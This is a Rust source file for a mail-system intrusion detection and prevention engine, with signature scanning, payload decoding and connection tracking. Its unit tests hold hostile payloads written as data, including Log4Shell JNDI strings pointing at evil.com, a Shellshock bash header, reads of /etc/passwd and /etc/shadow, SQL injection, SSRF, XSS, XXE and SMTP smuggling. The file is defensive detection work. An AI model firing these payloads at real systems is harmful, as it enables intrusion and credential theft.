//! Main IDS/IPS engine orchestrator

use std::net::IpAddr;
use std::sync::Arc;
use std::time::{Duration, Instant};

use dashmap::DashMap;
use mail_common::{
    CorrelationContext, SecurityAction, SecurityEvent, SecuritySeverity, SecuritySystem,
};
use tracing::{info, warn};

use crate::config::IdsConfig;
use crate::connection_tracker::{ConnectionAnomaly, ConnectionTracker};
use crate::protocol_analyzer;
use crate::signature::{self, SigSeverity, SignatureAction, SignatureSet};

/// Alert severity for external consumers
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum AlertSeverity {
    /// Informational
    Info,
    /// Low
    Low,
    /// Medium
    Medium,
    /// High
    High,
    /// Critical
    Critical,
}

impl From<SigSeverity> for AlertSeverity {
    fn from(s: SigSeverity) -> Self {
        match s {
            SigSeverity::Info => AlertSeverity::Info,
            SigSeverity::Low => AlertSeverity::Low,
            SigSeverity::Medium => AlertSeverity::Medium,
            SigSeverity::High => AlertSeverity::High,
            SigSeverity::Critical => AlertSeverity::Critical,
        }
    }
}

/// An IDS alert
#[derive(Debug, Clone)]
pub struct Alert {
    /// Alert ID / signature ID
    pub id: u32,
    /// Source IP
    pub src_ip: IpAddr,
    /// Destination port
    pub dst_port: u16,
    /// Severity
    pub severity: AlertSeverity,
    /// Message
    pub message: String,
    /// Category
    pub category: String,
    /// Recommended action
    pub action: IdsVerdict,
    /// Timestamp
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// IDS verdict on a packet/connection
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum IdsVerdict {
    /// Allow the traffic
    Pass,
    /// Alert but allow
    Alert,
    /// Drop the traffic (IPS mode)
    Drop,
    /// Reject (send RST/ICMP)
    Reject,
}

/// Main IDS/IPS engine
pub struct IdsEngine {
    config: Arc<IdsConfig>,
    signatures: Arc<SignatureSet>,
    conn_tracker: Arc<ConnectionTracker>,
    /// Alert rate limiting per IP
    alert_counts: DashMap<IpAddr, (u32, std::time::Instant)>,
}

impl IdsEngine {
    /// Create a new IDS engine with built-in signatures
    pub fn new(config: IdsConfig) -> Result<Self, crate::IdsError> {
        let sigs = signature::builtin_mail_signatures();
        let sig_set = SignatureSet::new(sigs).map_err(crate::IdsError::Signature)?;

        let conn_tracker = ConnectionTracker::new(
            config.max_connections,
            config.portscan_threshold,
            config.portscan_window_secs,
            config.syn_flood_threshold,
        );

        info!(
            signatures = sig_set.signature_count(),
            inline_mode = config.inline_mode,
            "IDS engine initialized"
        );

        Ok(Self {
            config: Arc::new(config),
            signatures: Arc::new(sig_set),
            conn_tracker: Arc::new(conn_tracker),
            alert_counts: DashMap::new(),
        })
    }

    /// Create with custom signature set
    pub fn with_signatures(
        config: IdsConfig,
        sigs: Vec<signature::Signature>,
    ) -> Result<Self, crate::IdsError> {
        let sig_set = SignatureSet::new(sigs).map_err(crate::IdsError::Signature)?;

        let conn_tracker = ConnectionTracker::new(
            config.max_connections,
            config.portscan_threshold,
            config.portscan_window_secs,
            config.syn_flood_threshold,
        );

        Ok(Self {
            config: Arc::new(config),
            signatures: Arc::new(sig_set),
            conn_tracker: Arc::new(conn_tracker),
            alert_counts: DashMap::new(),
        })
    }

    /// Inspect a packet/payload. Returns alerts and the recommended verdict.
    pub fn inspect(
        &self,
        src_ip: IpAddr,
        dst_port: u16,
        protocol: &str,
        payload: &[u8],
    ) -> (IdsVerdict, Vec<Alert>) {
        let mut alerts = Vec::with_capacity(8);
        let mut verdict = IdsVerdict::Pass;
        let now = chrono::Utc::now();

        // 1. Signature scan with payload normalization
        let truncated = if payload.len() > self.config.max_payload_inspect {
            warn!(
                original_len = payload.len(),
                max_inspect = self.config.max_payload_inspect,
                "IDS: Payload truncated for inspection; content spanning the truncation boundary may evade detection"
            );
            &payload[..self.config.max_payload_inspect]
        } else {
            payload
        };

        // Scan the ORIGINAL bytes first (preserves binary patterns like NOP
        // sleds that `from_utf8_lossy` would mangle), then also scan the
        // URL/HTML-entity-decoded form to catch evasion attempts. Merge both
        // result sets, deduplicating by SID.
        let normalized = normalize_payload(truncated);
        let raw_matches = self.signatures.scan(truncated);
        let norm_matches = self.signatures.scan(&normalized);
        let mut seen_sids = std::collections::HashSet::new();
        let scan_matches: Vec<_> = raw_matches
            .into_iter()
            .chain(norm_matches)
            .filter(|m| seen_sids.insert(m.sid))
            .collect();
        for m in &scan_matches {
            let ids_verdict = match m.action {
                SignatureAction::Drop => IdsVerdict::Drop,
                SignatureAction::Reject => IdsVerdict::Reject,
                SignatureAction::Alert => IdsVerdict::Alert,
                SignatureAction::Pass => IdsVerdict::Pass,
            };
            if ids_verdict as u8 > verdict as u8 {
                verdict = ids_verdict;
            }
            alerts.push(Alert {
                id: m.sid,
                src_ip,
                dst_port,
                severity: AlertSeverity::from(m.severity),
                message: m.message.clone(),
                category: m.category.clone(),
                action: ids_verdict,
                timestamp: now,
            });
        }

        // 2. Protocol anomaly detection
        let protocol_anomalies = match protocol {
            "smtp" if self.config.enable_smtp_validation => {
                protocol_analyzer::analyze_smtp(payload)
            }
            "dns" if self.config.enable_dns_validation => protocol_analyzer::analyze_dns(payload),
            "tls" if self.config.enable_tls_validation => protocol_analyzer::analyze_tls(payload),
            _ => Vec::new(),
        };
        for anomaly in &protocol_anomalies {
            let ids_verdict = match anomaly.action {
                SignatureAction::Drop => IdsVerdict::Drop,
                SignatureAction::Reject => IdsVerdict::Reject,
                _ => IdsVerdict::Alert,
            };
            if ids_verdict as u8 > verdict as u8 {
                verdict = ids_verdict;
            }
            alerts.push(Alert {
                id: anomaly.id,
                src_ip,
                dst_port,
                severity: AlertSeverity::from(anomaly.severity),
                message: anomaly.message.clone(),
                category: anomaly.protocol.clone(),
                action: ids_verdict,
                timestamp: now,
            });
        }

        // 3. Connection tracking anomalies
        let conn_anomalies = if is_syn_probe(protocol, payload) {
            self.conn_tracker.record_syn(src_ip, dst_port)
        } else {
            Vec::new()
        };
        for anomaly in &conn_anomalies {
            let (id, msg, sev) = match anomaly {
                ConnectionAnomaly::PortScan { ip, unique_ports } => (
                    4000001,
                    format!("Port scan from {}: {} unique ports", ip, unique_ports),
                    AlertSeverity::High,
                ),
                ConnectionAnomaly::SynFlood { ip, half_open } => (
                    4000002,
                    format!("SYN flood from {}: {} half-open", ip, half_open),
                    AlertSeverity::Critical,
                ),
                ConnectionAnomaly::ConnectionFlood { ip } => (
                    4000003,
                    format!("Connection table exhaustion from {}", ip),
                    AlertSeverity::Critical,
                ),
            };
            if self.config.inline_mode {
                verdict = IdsVerdict::Drop;
            } else if verdict == IdsVerdict::Pass {
                verdict = IdsVerdict::Alert;
            }
            alerts.push(Alert {
                id,
                src_ip,
                dst_port,
                severity: sev,
                message: msg,
                category: "network-anomaly".into(),
                action: if self.config.inline_mode {
                    IdsVerdict::Drop
                } else {
                    IdsVerdict::Alert
                },
                timestamp: now,
            });
        }

        // In detection-only mode, never actually drop
        if !self.config.inline_mode && verdict == IdsVerdict::Drop {
            verdict = IdsVerdict::Alert;
        }

        if !alerts.is_empty() {
            self.record_alert_count(src_ip, alerts.len() as u32);
            warn!(
                src_ip = %src_ip,
                alert_count = alerts.len(),
                verdict = ?verdict,
                "IDS alerts generated"
            );
        }

        (verdict, alerts)
    }

    /// Inspect payload and emit a normalized security event.
    pub fn inspect_with_event(
        &self,
        src_ip: IpAddr,
        dst_port: u16,
        protocol: &str,
        payload: &[u8],
        correlation: Option<CorrelationContext>,
    ) -> ((IdsVerdict, Vec<Alert>), SecurityEvent) {
        let (verdict, alerts) = self.inspect(src_ip, dst_port, protocol, payload);
        let correlation = correlation.unwrap_or_else(CorrelationContext::generated);

        let (action, severity, risk_score) = match verdict {
            IdsVerdict::Pass => (SecurityAction::Allow, SecuritySeverity::Info, 1.0),
            IdsVerdict::Alert => (SecurityAction::Monitor, SecuritySeverity::Medium, 5.0),
            IdsVerdict::Drop => (SecurityAction::Drop, SecuritySeverity::High, 9.0),
            IdsVerdict::Reject => (SecurityAction::Reject, SecuritySeverity::High, 8.0),
        };

        let top_severity = alerts
            .iter()
            .map(|a| match a.severity {
                AlertSeverity::Info => SecuritySeverity::Info,
                AlertSeverity::Low => SecuritySeverity::Low,
                AlertSeverity::Medium => SecuritySeverity::Medium,
                AlertSeverity::High => SecuritySeverity::High,
                AlertSeverity::Critical => SecuritySeverity::Critical,
            })
            .max()
            .unwrap_or(severity);

        let mut event = SecurityEvent::new(
            SecuritySystem::Ids,
            action,
            top_severity,
            risk_score,
            format!(
                "IDS verdict={:?} alerts={} protocol={} dst_port={}",
                verdict,
                alerts.len(),
                protocol,
                dst_port
            ),
            correlation,
        )
        .with_metadata("src_ip", src_ip.to_string())
        .with_metadata("protocol", protocol.to_string())
        .with_metadata("dst_port", dst_port.to_string());

        if let Some(alert) = mail_common::ingest_security_event(event.clone()) {
            event
                .metadata
                .insert("composite_alert".to_string(), "true".to_string());
            event.metadata.insert(
                "composite_score".to_string(),
                format!("{:.2}", alert.composite_score),
            );
            event.metadata.insert(
                "composite_action".to_string(),
                format!("{:?}", alert.recommended_action),
            );
        }

        ((verdict, alerts), event)
    }

    /// Get active connection count
    pub fn active_connections(&self) -> usize {
        self.conn_tracker.active_connections()
    }

    /// Run periodic cleanup
    pub fn cleanup(&self) {
        let timeout = Duration::from_secs(self.config.connection_timeout_secs);
        self.conn_tracker.cleanup(timeout);

        // Evict stale alert rate-limit entries (older than 60 seconds)
        let stale_cutoff = Instant::now() - Duration::from_secs(60);
        self.alert_counts
            .retain(|_, (_, instant)| *instant > stale_cutoff);
        self.evict_alert_counts_over_capacity();
    }

    fn record_alert_count(&self, src_ip: IpAddr, count: u32) {
        let now = Instant::now();
        {
            let mut entry = self.alert_counts.entry(src_ip).or_insert((0, now));
            if now.duration_since(entry.1) > Duration::from_secs(60) {
                *entry = (count, now);
            } else {
                entry.0 = entry.0.saturating_add(count);
                entry.1 = now;
            }
        }
        self.evict_alert_counts_over_capacity();
    }

    fn evict_alert_counts_over_capacity(&self) -> usize {
        let max_entries = self.config.max_alert_count_entries;
        let before = self.alert_counts.len();
        if before <= max_entries {
            return 0;
        }

        if max_entries == 0 {
            self.alert_counts.clear();
            return before;
        }

        let mut entries: Vec<(IpAddr, Instant)> = self
            .alert_counts
            .iter()
            .map(|entry| (*entry.key(), entry.value().1))
            .collect();
        entries.sort_by_key(|(_, last_seen)| *last_seen);

        for (ip, _) in entries.into_iter().take(before - max_entries) {
            self.alert_counts.remove(&ip);
        }

        let removed = before - self.alert_counts.len();
        if removed > 0 {
            tracing::debug!(
                removed,
                remaining = self.alert_counts.len(),
                max_entries,
                "Evicted over-capacity alert_counts entries"
            );
        }
        removed
    }

    /// Spawn a background Tokio task that calls [`Self::cleanup`] every
    /// `interval_secs` seconds.
    /// Without this (or equivalent external scheduling), the connection tracker
    /// and alert rate-limit map grow unboundedly for long-lived processes.
    /// The returned [`tokio::task::JoinHandle`] can be aborted by the caller
    /// to stop the background loop on shutdown.
    /// Requires the engine to be wrapped in an `Arc` so the task can hold an
    /// independent reference after this method returns.
    pub fn run_cleanup_loop(
        self: std::sync::Arc<Self>,
        interval_secs: u64,
    ) -> tokio::task::JoinHandle<()> {
        tokio::spawn(async move {
            let interval = tokio::time::Duration::from_secs(interval_secs);
            let mut ticker = tokio::time::interval(interval);
            // Skip the immediate first tick so we don't clean up on startup.
            ticker.tick().await;
            loop {
                ticker.tick().await;
                let before_conns = self.active_connections();
                self.cleanup();
                let after_conns = self.active_connections();
                if before_conns != after_conns {
                    tracing::debug!(
                        removed = before_conns.saturating_sub(after_conns),
                        remaining = after_conns,
                        "IDS engine periodic cleanup evicted stale connections"
                    );
                }
            }
        })
    }
}

fn is_syn_probe(protocol: &str, payload: &[u8]) -> bool {
    let normalized = protocol.trim().to_ascii_lowercase();
    matches!(
        normalized.as_str(),
        "syn" | "tcp_syn" | "tcp-syn" | "tcp/syn" | "tcp_syn_packet"
    ) || (normalized == "tcp" && payload.is_empty())
        || payload.starts_with(b"SYN ")
        || payload == b"SYN"
}

/// Normalize a payload for evasion-resistant signature matching.
/// Performs a single pass of:/// 1. URL-decoding (`%XX` → byte)
/// 2. HTML entity decoding (`&#NNN;`, `&#xHH;`, `&lt;`, `&gt;`, `&amp;`, `&quot;`)
/// This ensures signatures written in plain text still match payloads that
/// have been encoded to bypass pattern-based detection.
fn normalize_payload(data: &[u8]) -> Vec<u8> {
    let text = String::from_utf8_lossy(data);
    let mut result = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();

    while let Some(ch) = chars.next() {
        match ch {
            // URL-form-encoded space:`+` in query strings is decoded as space.
            // Attackers use `+` to bypass regex patterns that match on \s+,
            // e.g., `UNION+SELECT` evades `union\s+select` without this step.
            '+' => result.push(' '),
            // URL decoding:%XX
            '%' => {
                let mut hex = String::new();
                for _ in 0..2 {
                    if let Some(&c) = chars.peek() {
                        if c.is_ascii_hexdigit() {
                            hex.push(c);
                            chars.next();
                        } else {
                            break;
                        }
                    }
                }
                if hex.len() == 2 {
                    if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                        result.push(byte as char);
                    } else {
                        result.push('%');
                        result.push_str(&hex);
                    }
                } else {
                    result.push('%');
                    result.push_str(&hex);
                }
            }
            // HTML entity decoding:&...;
            '&' => {
                let mut entity = String::new();
                let mut found_semi = false;
                // Collect up to 10 chars looking for ';'
                let mut lookahead: Vec<char> = Vec::new();
                while let Some(&c) = chars.peek() {
                    if c == ';' {
                        chars.next();
                        found_semi = true;
                        break;
                    }
                    if entity.len() >= 10 {
                        break;
                    }
                    entity.push(c);
                    lookahead.push(c);
                    chars.next();
                }
                if found_semi {
                    match entity.as_str() {
                        "lt" => result.push('<'),
                        "gt" => result.push('>'),
                        "amp" => result.push('&'),
                        "quot" => result.push('"'),
                        "apos" => result.push('\''),
                        s if s.starts_with('#') => {
                            let num_str = &s[1..];
                            let code = if num_str.starts_with('x') || num_str.starts_with('X') {
                                u32::from_str_radix(&num_str[1..], 16).ok()
                            } else {
                                num_str.parse::<u32>().ok()
                            };
                            if let Some(c) = code.and_then(char::from_u32) {
                                result.push(c);
                            } else {
                                result.push('&');
                                result.push_str(&entity);
                                result.push(';');
                            }
                        }
                        _ => {
                            result.push('&');
                            result.push_str(&entity);
                            result.push(';');
                        }
                    }
                } else {
                    result.push('&');
                    result.push_str(&entity);
                }
            }
            other => result.push(other),
        }
    }

    result.into_bytes()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_engine() -> IdsEngine {
        IdsEngine::new(IdsConfig::default()).expect("init IDS engine")
    }

    #[allow(clippy::field_reassign_with_default)]
    fn make_inline_engine() -> IdsEngine {
        let mut config = IdsConfig::default();
        config.inline_mode = true;
        IdsEngine::new(config).expect("init inline IDS engine")
    }

    fn ip(s: &str) -> IpAddr {
        s.parse().unwrap_or_else(|_| IpAddr::from([10, 0, 0, 1]))
    }

    // ── Basic engine tests ──

    #[test]
    fn test_ids_engine_basic() {
        let engine = make_engine();
        let (_, alerts) = engine.inspect(ip("10.0.0.1"), 25, "smtp", b"VRFY root\r\n");
        assert!(
            !alerts.is_empty(),
            "SMTP VRFY recon must trigger an IDS alert"
        );
    }

    #[test]
    fn test_ids_clean_traffic() {
        let engine = make_engine();
        let (verdict, alerts) = engine.inspect(
            ip("10.0.0.1"),
            80,
            "http",
            b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
        );
        assert!(matches!(verdict, IdsVerdict::Pass | IdsVerdict::Alert));
        assert!(
            alerts.is_empty()
                || alerts
                    .iter()
                    .all(|a| matches!(a.action, IdsVerdict::Pass | IdsVerdict::Alert)),
            "Clean HTTP GET shouldn't trigger drops"
        );
    }

    #[test]
    fn test_ids_inline_mode() {
        let engine = make_inline_engine();
        let i = ip("10.0.0.5");
        for port in 1..=5 {
            let _ = engine.inspect(i, port, "tcp", b"");
        }
    }

    #[test]
    #[allow(clippy::field_reassign_with_default)]
    fn non_syn_inspection_does_not_record_connection_anomalies() {
        let mut config = IdsConfig::default();
        config.inline_mode = true;
        config.syn_flood_threshold = 1;
        let engine = IdsEngine::new(config).expect("init IDS engine");
        let source = ip("10.0.0.42");

        let (_, first_alerts) = engine.inspect(source, 25, "smtp", b"EHLO example\r\n");
        let (_, second_alerts) =
            engine.inspect(source, 25, "smtp", b"MAIL FROM:<a@example.com>\r\n");

        assert!(!first_alerts.iter().any(|alert| alert.id == 4000002));
        assert!(!second_alerts.iter().any(|alert| alert.id == 4000002));
    }

    #[test]
    #[allow(clippy::field_reassign_with_default)]
    fn syn_probe_records_connection_anomalies() {
        let mut config = IdsConfig::default();
        config.inline_mode = true;
        config.syn_flood_threshold = 1;
        let engine = IdsEngine::new(config).expect("init IDS engine");
        let source = ip("10.0.0.43");

        let _ = engine.inspect(source, 25, "tcp_syn", b"");
        let (_, alerts) = engine.inspect(source, 26, "tcp_syn", b"");

        assert!(alerts.iter().any(|alert| alert.id == 4000002));
    }

    #[test]
    fn test_ids_with_event() {
        let engine = make_engine();
        let ((_verdict, _alerts), event) =
            engine.inspect_with_event(ip("10.0.0.1"), 25, "smtp", b"EHLO test\r\n", None);
        assert_eq!(event.system, SecuritySystem::Ids);
    }

    // ── SMTP smuggling tests ──

    #[test]
    fn test_smtp_smuggling_dot_stuffing() {
        let engine = make_engine();
        let payload = b"DATA\r\nSubject: test\r\n.\r\nMAIL FROM:<attacker@evil.com>\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.2"), 25, "smtp", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000057),
            "SMTP DATA smuggling via dot-stuffing should be detected: {:?}",
            alerts.iter().map(|a| a.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_smtp_bare_lf_smuggling() {
        let engine = make_engine();
        let payload = b"\nMAIL FROM:<smuggled@evil.com>\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.3"), 25, "smtp", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000065),
            "Bare LF SMTP smuggling should be detected"
        );
    }

    // ── Log4Shell variant tests ──

    #[test]
    fn test_log4shell_basic() {
        let engine = make_engine();
        let payload = b"GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.4"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000012 || a.id == 2000017),
            "Basic Log4Shell should be detected"
        );
    }

    #[test]
    fn test_log4shell_obfuscated_nested() {
        let engine = make_engine();
        let payload = b"GET / HTTP/1.1\r\nX-Api-Version: ${j${::-n}di:ldap://evil.com/x}\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.5"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000090),
            "Obfuscated nested Log4Shell should be caught by regex SID 2000090: {:?}",
            alerts.iter().map(|a| a.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_log4shell_protocol_variants() {
        let engine = make_engine();
        for proto in &["ldap://", "rmi://", "dns://", "iiop://"] {
            let payload = format!("GET /?x=${{jndi:{}evil.com/a}} HTTP/1.1\r\n", proto);
            let (_, alerts) = engine.inspect(ip("10.0.0.6"), 80, "http", payload.as_bytes());
            assert!(
                !alerts.is_empty(),
                "Log4Shell via jndi:{} should be detected",
                proto
            );
        }
    }

    // ── Web exploit detection ──

    #[test]
    fn test_path_traversal_dotdot() {
        let engine = make_engine();
        let payload = b"GET /../../../../etc/passwd HTTP/1.1\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.7"), 80, "http", payload);
        assert!(
            alerts
                .iter()
                .any(|a| a.category == "exploit" || a.category == "traversal"),
            "Path traversal should be detected: {:?}",
            alerts
                .iter()
                .map(|a| (a.id, &a.category))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_path_traversal_url_encoded() {
        let engine = make_engine();
        let payload = b"GET /%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.8"), 80, "http", payload);
        assert!(
            !alerts.is_empty(),
            "URL-encoded path traversal should be detected"
        );
    }

    #[test]
    fn test_spring4shell() {
        let engine = make_engine();
        let payload = b"GET /?class.module.classLoader.resources HTTP/1.1\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.9"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000013),
            "Spring4Shell should be detected"
        );
    }

    #[test]
    fn test_shellshock() {
        let engine = make_engine();
        let payload = b"GET /cgi-bin/test HTTP/1.1\r\nUser-Agent: () { :; }; /bin/bash -i\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.10"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000050),
            "Shellshock should be detected"
        );
    }

    // ── SQL injection tests ──

    #[test]
    fn test_sqli_union_select() {
        let engine = make_engine();
        let payload = b"GET /search?q=1'+UNION+ALL+SELECT+password+FROM+users -- HTTP/1.1\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.11"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000091),
            "UNION SELECT SQLi should be detected: {:?}",
            alerts.iter().map(|a| a.id).collect::<Vec<_>>()
        );
    }

    // ── SSRF tests ──

    #[test]
    fn test_ssrf_cloud_metadata() {
        let engine = make_engine();
        let payload = b"GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.12"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000055),
            "SSRF to AWS metadata should be detected"
        );
    }

    // ── XSS tests ──

    #[test]
    fn test_xss_script_tag() {
        let engine = make_engine();
        let payload = b"POST /comment HTTP/1.1\r\n\r\n<script>alert(document.cookie)</script>";
        let (_, alerts) = engine.inspect(ip("10.0.0.13"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.category == "xss"),
            "XSS script tag should be detected"
        );
    }

    #[test]
    fn test_xss_event_handler() {
        let engine = make_engine();
        let payload = b"<img src=x onerror=alert(1)>";
        let (_, alerts) = engine.inspect(ip("10.0.0.14"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000095),
            "XSS event handler should be detected by regex sig"
        );
    }

    // ── Command injection ──

    #[test]
    fn test_command_injection() {
        let engine = make_engine();
        let payload = b"POST /api/exec HTTP/1.1\r\n\r\nhost=; cat /etc/shadow";
        let (_, alerts) = engine.inspect(ip("10.0.0.15"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000092),
            "Command injection should be detected by regex"
        );
    }

    // ── SMTP auth abuse ──

    #[test]
    fn test_smtp_auth_plain() {
        let engine = make_engine();
        let payload = b"AUTH PLAIN dXNlcjpwYXNz\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.16"), 25, "smtp", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000040),
            "AUTH PLAIN should trigger brute-force alert"
        );
    }

    // ── Malware attachment tests ──

    #[test]
    fn test_double_extension_attachment() {
        let engine = make_engine();
        let payload = b"Content-Disposition: attachment; filename=\"report.pdf.exe\"\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.17"), 25, "smtp", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000096 || a.id == 2000079),
            "Double extension attachment should be detected"
        );
    }

    // ── Deserialization attacks ──

    #[test]
    fn test_java_deserialization() {
        let engine = make_engine();
        let payload = b"POST /api HTTP/1.1\r\n\r\nrO0ABjava.lang.Runtime";
        let (_, alerts) = engine.inspect(ip("10.0.0.18"), 80, "http", payload);
        let has_deser = alerts.iter().any(|a| a.id == 2000069);
        assert!(has_deser, "Java deserialization should be detected");
    }

    // ── XXE ──

    #[test]
    fn test_xxe_attack() {
        let engine = make_engine();
        let payload =
            b"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>";
        let (_, alerts) = engine.inspect(ip("10.0.0.19"), 80, "http", payload);
        assert!(
            alerts.iter().any(|a| a.id == 2000070),
            "XXE should be detected"
        );
    }

    // ── Payload normalization ──

    #[test]
    fn test_normalize_payload_url_decoding() {
        let data = b"%3Cscript%3Ealert(1)%3C/script%3E";
        let normalized = normalize_payload(data);
        assert!(
            String::from_utf8_lossy(&normalized).contains("<script>"),
            "URL-encoded <script> should be decoded"
        );
    }

    #[test]
    fn test_normalize_payload_html_entity() {
        let data = b"&lt;script&gt;alert(1)&lt;/script&gt;";
        let normalized = normalize_payload(data);
        assert!(
            String::from_utf8_lossy(&normalized).contains("<script>"),
            "HTML entity <script> should be decoded"
        );
    }

    #[test]
    fn test_normalize_numeric_html_entity() {
        let data = b"&#60;script&#62;alert(1)";
        let normalized = normalize_payload(data);
        let s = String::from_utf8_lossy(&normalized);
        assert!(
            s.contains("<script>"),
            "Numeric entity should decode: {}",
            s
        );
    }

    // ── Detection-only mode ──

    #[test]
    fn test_detection_mode_no_drop() {
        let engine = make_engine(); // inline_mode = false (default)
        let payload = b"GET /?x=${jndi:ldap://evil.com/x} HTTP/1.1\r\n";
        let (verdict, _) = engine.inspect(ip("10.0.0.20"), 80, "http", payload);
        // In detection-only mode, verdict should be Alert, not Drop
        assert_ne!(
            verdict,
            IdsVerdict::Drop,
            "Detection-only mode should not drop"
        );
    }

    #[test]
    fn test_inline_mode_drops() {
        let engine = make_inline_engine();
        let payload = b"GET /?x=${jndi:ldap://evil.com/x} HTTP/1.1\r\n";
        let (verdict, _) = engine.inspect(ip("10.0.0.21"), 80, "http", payload);
        assert_eq!(
            verdict,
            IdsVerdict::Drop,
            "Inline/IPS mode should drop malicious traffic"
        );
    }

    // ── Cleanup ──

    #[test]
    fn test_cleanup_runs() {
        let engine = make_engine();
        engine.cleanup();
        assert_eq!(engine.active_connections(), 0);
    }

    #[test]
    #[allow(clippy::field_reassign_with_default)]
    fn test_alert_counts_evict_least_recent_over_capacity() {
        let mut config = IdsConfig::default();
        config.max_alert_count_entries = 2;
        let engine = IdsEngine::new(config).expect("init IDS engine");

        engine.record_alert_count(ip("10.0.0.1"), 1);
        std::thread::sleep(std::time::Duration::from_millis(2));
        engine.record_alert_count(ip("10.0.0.2"), 1);
        std::thread::sleep(std::time::Duration::from_millis(2));
        engine.record_alert_count(ip("10.0.0.3"), 1);

        assert_eq!(engine.alert_counts.len(), 2);
        assert!(!engine.alert_counts.contains_key(&ip("10.0.0.1")));
        assert!(engine.alert_counts.contains_key(&ip("10.0.0.2")));
        assert!(engine.alert_counts.contains_key(&ip("10.0.0.3")));
    }

    // ── Edge cases ──

    #[test]
    fn test_empty_payload() {
        let engine = make_engine();
        let (verdict, alerts) = engine.inspect(ip("10.0.0.22"), 80, "http", b"");
        assert_eq!(verdict, IdsVerdict::Pass);
        assert!(alerts.is_empty() || alerts.iter().all(|a| !matches!(a.action, IdsVerdict::Drop)));
    }

    #[test]
    fn test_very_large_payload_truncation() {
        let engine = make_engine();
        let large = vec![b'A'; 10_000_000]; // 10 MB
        let (verdict, _) = engine.inspect(ip("10.0.0.23"), 80, "http", &large);
        // Should not panic and should truncate to max_payload_inspect
        assert!(matches!(verdict, IdsVerdict::Pass | IdsVerdict::Alert));
    }

    #[test]
    fn test_binary_payload() {
        let engine = make_engine();
        let binary: Vec<u8> = (0..256u16).map(|i| i as u8).collect();
        let (_, _) = engine.inspect(ip("10.0.0.24"), 80, "tcp", &binary);
        // Should not panic on binary data
    }

    // ── Multi-alert deduplication ──

    #[test]
    fn test_alerts_deduplicated_across_raw_and_normalized() {
        let engine = make_engine();
        // This payload matches both raw and normalized (URL-decoded form)
        let payload = b"VRFY admin\r\n";
        let (_, alerts) = engine.inspect(ip("10.0.0.25"), 25, "smtp", payload);
        let vrfy_count = alerts.iter().filter(|a| a.id == 2000003).count();
        assert_eq!(
            vrfy_count, 1,
            "Same SID should appear only once after dedup"
        );
    }
}
